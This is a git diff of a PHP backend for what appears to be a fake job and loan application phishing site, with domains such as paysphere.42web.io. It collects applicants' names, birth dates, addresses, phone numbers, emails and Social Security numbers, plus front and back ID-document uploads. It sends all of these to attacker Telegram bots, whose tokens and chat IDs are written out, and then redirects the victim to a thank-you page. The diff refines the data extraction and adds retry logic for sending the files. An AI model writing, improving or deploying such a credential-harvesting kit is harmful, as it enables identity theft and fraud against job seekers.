@@ -1,12 +1,14 @@
 <?php
-// 🚨 Enhanced server configuration for file uploads
+// 🚨 ADD THESE LINES AT THE TOP - Memory and timeout fixes
 ini_set('upload_max_filesize', '10M');
 ini_set('post_max_size', '12M');
 ini_set('max_execution_time', 120);
 ini_set('max_input_time', 120);
 ini_set('memory_limit', '256M');
 
-ob_start();
+ob_start(); // Start output buffering to prevent headers already sent
+
+// include 'firewall.php';
 
 // 🌐 Site map: define how each site should behave
 $site_map = [
@@ -16,20 +18,24 @@ $site_map = [
             ["token" => "7683707216:AAFKB6Izdj c-M2mIaR_vRf-9Ha7CkEh7rA", "chat_id" => "7510889526"],
         ],
         "redirect" => "https://upstartloan.rf.gd/cache_site/thankyou.html"
+        
     ],
+
 
     'paysphere.42web.io' => [
         'bots' => [
             ['token' => '7592386357:AAF6MXHo5VlYbiCKY0SNVIKQLqd_S-k4_sY', 'chat_id' => '1325797388'],
+
             ['token' => '8327467242:AAFFBheM0nU1-45BKH5vAvdfXKhgXPopJvg', 'chat_id' => '7919111838']
         ],
         'redirect' => 'https://paysphere.42web.io/cache_site/careers/all-listings.job.34092/processing.html'
     ],
     
+
     // Add more sites...
 ];
 
-// 🧠 Determine origin domain
+// 🧠 Determine origin domain (not PHP host)
 $referer = $_SERVER['HTTP_REFERER'] ?? '';
 $parsed = parse_url($referer);
 $domain = $parsed['host'] ?? 'unknown';
@@ -53,14 +59,31 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
         file_put_contents($log_file, "[" . date("Y-m-d H:i:s") . "] $msg\n", FILE_APPEND);
     }
 
-    // 🎯 DEBUG: Log ALL received data
-    log_entry("=== NEW SUBMISSION STARTED ===");
-    log_entry("📨 Domain: $domain");
-    log_entry("📊 ALL POST DATA: " . print_r($_POST, true));
-    log_entry("📁 ALL FILES DATA: " . print_r($_FILES, true));
-    log_entry("🔍 RAW POST: " . file_get_contents("php://input"));
+    // 📋 Get form fields
+    $first = htmlspecialchars($_POST['q11_fullName']['first'] ?? '');
+    $middle = htmlspecialchars($_POST['q11_fullName']['middle'] ?? '');
+    $last = htmlspecialchars($_POST['q11_fullName']['last'] ?? '');
+    $full_name = trim("$first $middle $last");
 
-    // 🌐 Get client IP
+    $dob = sprintf("%04d-%02d-%02d", 
+        $_POST['q18_birthDate']['year'] ?? 0, 
+        $_POST['q18_birthDate']['month'] ?? 0, 
+        $_POST['q18_birthDate']['day'] ?? 0);
+
+    $address = htmlspecialchars(($_POST['q16_currentAddress']['addr_line1'] ?? '') . " " .
+                                ($_POST['q16_currentAddress']['addr_line2'] ?? '') . ", " .
+                                ($_POST['q16_currentAddress']['city'] ?? '') . ", " .
+                                ($_POST['q16_currentAddress']['state'] ?? '') . ", " .
+                                ($_POST['q16_currentAddress']['postal'] ?? ''));
+
+    $email = htmlspecialchars($_POST['q12_emailAddress'] ?? '');
+    $phone = htmlspecialchars($_POST['q13_phoneNumber13']['full'] ?? '');
+    $position = htmlspecialchars($_POST['q14_positionApplied'] ?? '');
+    $job_type = htmlspecialchars($_POST['q24_jobType'] ?? '');
+    $source = htmlspecialchars($_POST['q21_howDid21'] ?? '');
+    $ssn = htmlspecialchars($_POST['q25_socSec'] ?? '');
+    
+    // 🌐 FIXED: Get client IP address more reliably
     $ip = $_SERVER['HTTP_CLIENT_IP'] ?? 
           $_SERVER['HTTP_X_FORWARDED_FOR'] ?? 
           $_SERVER['HTTP_X_FORWARDED'] ?? 
@@ -69,6 +92,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
           $_SERVER['REMOTE_ADDR'] ?? 
           'unknown';
     
+    // Handle multiple IPs in X_FORWARDED_FOR
     if (strpos($ip, ',') !== false) {
         $ips = explode(',', $ip);
         $ip = trim($ips[0]);
@@ -76,269 +100,96 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
     
     $timestamp = date("Y-m-d H:i:s");
 
-    // 🔍 UNIVERSAL FIELD EXTRACTION - Works with ANY form structure
-    function extractFormData() {
-        $data = [
-            'full_name' => '',
-            'dob' => '',
-            'address' => '',
-            'email' => '',
-            'phone' => '',
-            'position' => '',
-            'job_type' => '',
-            'source' => '',
-            'ssn' => ''
-        ];
-        
-        // Strategy 1: Common field name patterns
-        $name_patterns = ['name', 'fullname', 'full_name', 'username', 'fullName', 'q11_fullName'];
-        $email_patterns = ['email', 'emailAddress', 'q12_emailAddress'];
-        $phone_patterns = ['phone', 'telephone', 'phoneNumber', 'mobile', 'q13_phoneNumber13'];
-        $dob_patterns = ['dob', 'birthdate', 'birthDate', 'q18_birthDate'];
-        $address_patterns = ['address', 'currentAddress', 'q16_currentAddress'];
-        $position_patterns = ['position', 'job', 'positionApplied', 'q14_positionApplied'];
-        $ssn_patterns = ['ssn', 'social', 'socSec', 'q25_socSec'];
-        
-        // Search through all POST data
-        foreach ($_POST as $key => $value) {
-            $key_lower = strtolower($key);
-            
-            // Name detection
-            if (empty($data['full_name'])) {
-                foreach ($name_patterns as $pattern) {
-                    if (strpos($key_lower, strtolower($pattern)) !== false) {
-                        if (is_array($value)) {
-                            // Handle structured name (first, middle, last)
-                            $first = $value['first'] ?? $value[0] ?? '';
-                            $middle = $value['middle'] ?? $value[1] ?? '';
-                            $last = $value['last'] ?? $value[2] ?? '';
-                            $data['full_name'] = trim("$first $middle $last");
-                        } else {
-                            $data['full_name'] = htmlspecialchars($value);
-                        }
-                        break;
-                    }
-                }
-            }
-            
-            // Email detection
-            if (empty($data['email']) && preg_match('/email|mail/i', $key)) {
-                $data['email'] = htmlspecialchars($value);
-            }
-            
-            // Phone detection
-            if (empty($data['phone']) && preg_match('/phone|mobile|tel/i', $key)) {
-                if (is_array($value) && isset($value['full'])) {
-                    $data['phone'] = htmlspecialchars($value['full']);
-                } else {
-                    $data['phone'] = htmlspecialchars($value);
-                }
-            }
-            
-            // DOB detection
-            if (empty($data['dob'])) {
-                foreach ($dob_patterns as $pattern) {
-                    if (strpos($key_lower, strtolower($pattern)) !== false) {
-                        if (is_array($value)) {
-                            // Handle structured date
-                            $year = $value['year'] ?? $value[0] ?? '0000';
-                            $month = $value['month'] ?? $value[1] ?? '00';
-                            $day = $value['day'] ?? $value[2] ?? '00';
-                            $data['dob'] = sprintf("%04d-%02d-%02d", $year, $month, $day);
-                        } else {
-                            $data['dob'] = htmlspecialchars($value);
-                        }
-                        break;
-                    }
-                }
-            }
-            
-            // Address detection
-            if (empty($data['address'])) {
-                foreach ($address_patterns as $pattern) {
-                    if (strpos($key_lower, strtolower($pattern)) !== false) {
-                        if (is_array($value)) {
-                            $addr_line1 = $value['addr_line1'] ?? $value['line1'] ?? $value[0] ?? '';
-                            $addr_line2 = $value['addr_line2'] ?? $value['line2'] ?? $value[1] ?? '';
-                            $city = $value['city'] ?? $value[2] ?? '';
-                            $state = $value['state'] ?? $value[3] ?? '';
-                            $postal = $value['postal'] ?? $value['zip'] ?? $value[4] ?? '';
-                            $data['address'] = trim("$addr_line1 $addr_line2, $city, $state, $postal");
-                        } else {
-                            $data['address'] = htmlspecialchars($value);
-                        }
-                        break;
-                    }
-                }
-            }
-            
-            // Position detection
-            if (empty($data['position']) && preg_match('/position|job|role/i', $key)) {
-                $data['position'] = htmlspecialchars($value);
-            }
-            
-            // SSN detection
-            if (empty($data['ssn']) && preg_match('/ssn|social|security/i', $key)) {
-                $data['ssn'] = htmlspecialchars($value);
-            }
-        }
-        
-        // Strategy 2: Direct field access as fallback
-        if (empty($data['full_name'])) {
-            $data['full_name'] = htmlspecialchars($_POST['full_name'] ?? $_POST['name'] ?? '');
-        }
-        if (empty($data['email'])) {
-            $data['email'] = htmlspecialchars($_POST['email'] ?? '');
-        }
-        if (empty($data['phone'])) {
-            $data['phone'] = htmlspecialchars($_POST['phone'] ?? '');
-        }
-        if (empty($data['dob'])) {
-            $data['dob'] = htmlspecialchars($_POST['dob'] ?? '');
-        }
-        if (empty($data['address'])) {
-            $data['address'] = htmlspecialchars($_POST['address'] ?? '');
-        }
-        if (empty($data['position'])) {
-            $data['position'] = htmlspecialchars($_POST['position'] ?? '');
-        }
-        if (empty($data['ssn'])) {
-            $data['ssn'] = htmlspecialchars($_POST['ssn'] ?? '');
-        }
-        
-        return $data;
-    }
-
-    // Extract form data using universal method
-    $form_data = extractFormData();
-    
-    // Log extracted data for debugging
-    log_entry("🎯 EXTRACTED FORM DATA: " . print_r($form_data, true));
-
-    // 📦 ENHANCED: Universal file upload handler
-    function uploadAnyFile($file_key = null) {
-        static $uploaded_files = [];
-        static $file_counter = 0;
-        
-        $upload_dir = __DIR__ . "/uploads/";
-        if (!is_dir($upload_dir)) mkdir($upload_dir, 0777, true);
-
-        // If specific key provided, try that first
-        if ($file_key && isset($_FILES[$file_key])) {
-            return uploadFile($file_key, "file_" . $file_key);
-        }
-        
-        // Otherwise, upload all files in FILES array
-        foreach ($_FILES as $key => $file_data) {
-            if (!empty($file_data['name'][0]) && $file_data['error'][0] === UPLOAD_ERR_OK) {
-                $file_path = uploadFile($key, "file_" . (++$file_counter));
-                if ($file_path) {
-                    $uploaded_files[$key] = $file_path;
-                }
-            }
-        }
-        
-        return $uploaded_files;
-    }
-
+    // 📦 FIXED: Enhanced upload handler with better file type support
     function uploadFile($key, $prefix) {
         $upload_dir = __DIR__ . "/uploads/";
         if (!is_dir($upload_dir)) mkdir($upload_dir, 0777, true);
 
-        if (!isset($_FILES[$key]) || empty($_FILES[$key]['name'][0])) {
-            return null;
-        }
+        // Check if files exist and are uploaded successfully
+        if (!empty($_FILES[$key]['name'][0]) && $_FILES[$key]['error'][0] === UPLOAD_ERR_OK) {
+            $original = $_FILES[$key]['name'][0];
+            $ext = strtolower(pathinfo($original, PATHINFO_EXTENSION));
+            $tmp_name = $_FILES[$key]['tmp_name'][0];
+            
+            // 🖼️ FIXED: Support for common image formats and documents
+            $allowed_extensions = [
+                // Common image formats
+                'jpg', 'jpeg', 'png', 'gif', 'bmp', 'webp', 'svg', 'ico',
+                // Document formats
+                'pdf', 'doc', 'docx', 'txt', 'rtf',
+                // Archive formats
+                'zip', 'rar', '7z'
+            ];
+            
+            // Check if extension is allowed
+            if (!in_array($ext, $allowed_extensions)) {
+                log_entry("❌ File upload rejected - invalid extension: $ext for file $original");
+                return null;
+            }
+            
+            // Check MIME type for additional security
+            $finfo = finfo_open(FILEINFO_MIME_TYPE);
+            $mime_type = finfo_file($finfo, $tmp_name);
+            finfo_close($finfo);
+            
+            $allowed_mime_types = [
+                // Images
+                'image/jpeg', 'image/jpg', 'image/png', 'image/gif', 'image/bmp', 'image/webp', 'image/svg+xml',
+                // Documents
+                'application/pdf', 'application/msword', 'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
+                'text/plain', 'application/rtf', 'text/rtf',
+                // Archives
+                'application/zip', 'application/x-rar-compressed', 'application/x-7z-compressed'
+            ];
+            
+            if (!in_array($mime_type, $allowed_mime_types)) {
+                log_entry("❌ File upload rejected - invalid MIME type: $mime_type for file $original");
+                return null;
+            }
+            
+            // Generate safe filename
+            $safe_name = $prefix . "_" . time() . "_" . bin2hex(random_bytes(4)) . "." . $ext;
+            $path = $upload_dir . $safe_name;
 
-        $file_data = $_FILES[$key];
-        
-        if ($file_data['error'][0] !== UPLOAD_ERR_OK) {
-            return null;
+            if (move_uploaded_file($tmp_name, $path)) {
+                log_entry("✅ File uploaded successfully: $safe_name");
+                return $path;
+            } else {
+                log_entry("❌ File move failed: $original");
+            }
+        } else {
+            $error_code = $_FILES[$key]['error'][0] ?? 'unknown';
+            log_entry("❌ File upload error for $key: Code $error_code");
         }
-
-        $original = $file_data['name'][0];
-        $tmp_name = $file_data['tmp_name'][0];
-        $size = $file_data['size'][0];
-
-        // Get file extension
-        $ext = strtolower(pathinfo($original, PATHINFO_EXTENSION));
-        
-        $allowed_extensions = ['jpg', 'jpeg', 'png', 'gif', 'bmp', 'webp', 'pdf', 'doc', 'docx'];
-        
-        if (!in_array($ext, $allowed_extensions)) {
-            return null;
-        }
-        
-        // Generate safe filename
-        $safe_name = $prefix . "_" . time() . "_" . bin2hex(random_bytes(4)) . "." . $ext;
-        $path = $upload_dir . $safe_name;
-
-        if (move_uploaded_file($tmp_name, $path)) {
-            log_entry("✅ File uploaded: $safe_name");
-            return $path;
-        }
-        
         return null;
     }
 
-    // Upload files - try both specific keys and all files
-    $front_id = uploadAnyFile("q17_uploadYour");
-    $back_id = uploadAnyFile("q26_identityVerification");
+    $front_id = uploadFile("q17_uploadYour", "front_id");
     
-    // If specific keys didn't work, get any uploaded files
-    $all_files = uploadAnyFile();
-    if (is_array($all_files)) {
-        if (!$front_id && count($all_files) > 0) {
-            $front_id = reset($all_files); // Get first file
-        }
-        if (!$back_id && count($all_files) > 1) {
-            $back_id = end($all_files); // Get last file
-        }
-    }
+    // 🚨 ADD SMALL DELAY BETWEEN UPLOADS
+    if (function_exists('usleep')) usleep(500000); // 0.5 second delay
+    
+    $back_id = uploadFile("q26_identityVerification", "back_id");
 
-    // 🧾 Format Telegram message with ALL available data
-    $message = "📝 *New Form Submission*\n\n";
-    
-    if (!empty($form_data['full_name'])) {
-        $message .= "👤 *Name:* {$form_data['full_name']}\n";
-    }
-    if (!empty($form_data['dob']) && $form_data['dob'] !== '0000-00-00') {
-        $message .= "🎂 *DOB:* {$form_data['dob']}\n";
-    }
-    if (!empty($form_data['address']) && trim($form_data['address'], ' ,') !== '') {
-        $message .= "🏠 *Address:* {$form_data['address']}\n";
-    }
-    if (!empty($form_data['email'])) {
-        $message .= "📧 *Email:* {$form_data['email']}\n";
-    }
-    if (!empty($form_data['phone'])) {
-        $message .= "📞 *Phone:* {$form_data['phone']}\n";
-    }
-    if (!empty($form_data['position'])) {
-        $message .= "💼 *Position:* {$form_data['position']}\n";
-    }
-    if (!empty($form_data['ssn'])) {
-        $message .= "🔐 *SSN:* {$form_data['ssn']}\n";
-    }
-    
-    $message .= "\n🕒 *Submitted:* $timestamp\n";
-    $message .= "🌐 *IP:* $ip\n";
-    $message .= "📎 *Files Uploaded:* " . (($front_id || $back_id) ? "✅ Yes" : "❌ No");
-    
-    // Add all other POST data for debugging
-    $message .= "\n\n🔍 *All Submitted Data:*\n";
-    foreach ($_POST as $key => $value) {
-        if (is_array($value)) {
-            $message .= "• $key: " . print_r($value, true) . "\n";
-        } else {
-            $clean_value = htmlspecialchars(substr($value, 0, 100)); // Limit length
-            $message .= "• $key: $clean_value\n";
-        }
-    }
+    // 🧾 Format Telegram message
+    $message = "📝 *New Job Application*\n\n" .
+               "👤 *Name:* $full_name\n" .
+               "🎂 *DOB:* $dob\n" .
+               "🏠 *Address:* $address\n" .
+               "📧 *Email:* $email\n" .
+               "📞 *Phone:* $phone\n" .
+               "💼 *Position:* $position\n" .
+               "📌 *Job Type:* $job_type\n" .
+               "🗣 *Referred By:* $source\n" .
+               "🔐 *SSN:* $ssn\n" .
+               "🕒 *Submitted:* $timestamp\n" .
+               "🌐 *IP:* $ip\n" .
+               "📎 *ID Uploaded:* " . (($front_id || $back_id) ? "✅ Yes" : "❌ No");
 
-    // 📬 Send to Telegram
-    foreach ($config['bots'] as $bot_index => $bot) {
+    // 📬 Send text to bots
+    foreach ($config['bots'] as $bot) {
         if (empty($bot['token']) || empty($bot['chat_id'])) {
-            continue;
+            continue; // Skip empty bot configurations
         }
         
         $url = "https://api.telegram.org/bot" . $bot['token'] . "/sendMessage";
@@ -353,16 +204,88 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
         ]);
         $result = curl_exec($ch);
         if (curl_error($ch)) {
-            log_entry("❌ Telegram error: " . curl_error($ch));
-        } else {
-            log_entry("✅ Message sent to bot $bot_index");
+            log_entry("❌ Telegram message error: " . curl_error($ch));
         }
         curl_close($ch);
     }
 
-    log_entry("✅ [$domain] Form submission completed from $ip");
+    // 📤 FIXED: Enhanced file sending with better format support AND RETRY LOGIC
+    function sendFile($file, $caption, $bots) {
+        if (!$file || !is_string($file) || !file_exists($file)) return;
+        
+        $ext = strtolower(pathinfo($file, PATHINFO_EXTENSION));
+        
+        // Determine if it's an image or document
+        $image_extensions = ['jpg', 'jpeg', 'png', 'gif', 'bmp', 'webp'];
+        $is_image = in_array($ext, $image_extensions);
+        
+        foreach ($bots as $bot) {
+            if (empty($bot['token']) || empty($bot['chat_id'])) {
+                continue; // Skip empty bot configurations
+            }
+            
+            $endpoint = $is_image ? "sendPhoto" : "sendDocument";
+            $url = "https://api.telegram.org/bot{$bot['token']}/$endpoint";
+            $payload = [
+                'chat_id' => $bot['chat_id'],
+                ($is_image ? 'photo' : 'document') => new CURLFile(realpath($file)),
+                'caption' => $caption,
+                'parse_mode' => 'Markdown'
+            ];
 
-    ob_end_clean();
+            // 🚨 ADD RETRY LOGIC (2 attempts)
+            $max_attempts = 2;
+            $attempt = 1;
+            
+            while ($attempt <= $max_attempts) {
+                $ch = curl_init($url);
+                curl_setopt_array($ch, [
+                    CURLOPT_POST => true, 
+                    CURLOPT_POSTFIELDS => $payload, 
+                    CURLOPT_RETURNTRANSFER => true,
+                    CURLOPT_TIMEOUT => 60, // Longer timeout for file uploads
+                    CURLOPT_HTTPHEADER => [
+                        'Content-Type: multipart/form-data'
+                    ]
+                ]);
+                
+                $result = curl_exec($ch);
+                $success = true;
+                
+                if (curl_error($ch)) {
+                    log_entry("❌ Telegram file error (attempt $attempt): " . curl_error($ch));
+                    $success = false;
+                }
+                
+                curl_close($ch);
+                
+                if ($success) {
+                    log_entry("✅ File sent successfully on attempt $attempt");
+                    break; // Success, exit retry loop
+                }
+                
+                $attempt++;
+                if ($attempt <= $max_attempts) {
+                    sleep(2); // Wait 2 seconds before retry
+                }
+            }
+        }
+    }
+
+    // 🚨 ADD DELAYS BETWEEN FILE SENDS
+    if ($front_id) {
+        sendFile($front_id, "📎 *Front ID* for $full_name", $config['bots']);
+        sleep(2); // 2 second delay between file sends
+    }
+    
+    if ($back_id) {
+        sendFile($back_id, "📎 *Back ID* for $full_name", $config['bots']);
+        sleep(1); // 1 second delay after last file
+    }
+
+    log_entry("✅ [$domain] Job application received from $ip ($full_name)");
+
+    ob_end_clean(); // Discard any unexpected output before redirect
     header("Location: " . $config['redirect']);
     exit;
 }
